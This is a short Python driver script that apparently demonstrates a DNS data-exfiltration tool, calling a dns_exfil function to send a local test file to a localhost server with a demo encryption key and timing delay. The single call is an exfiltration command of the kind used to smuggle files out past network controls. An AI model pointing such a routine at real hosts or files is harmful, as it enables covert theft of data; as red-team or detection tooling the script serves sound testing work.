from ExfiltrationClient import dns_exfil

if __name__ == "__main__":
    dns_exfil(host="127.0.0.1", path_to_file="C:\\tmp\\test.txt", key=b"This_key_for_demo_purposes_only!", time_delay=0.05)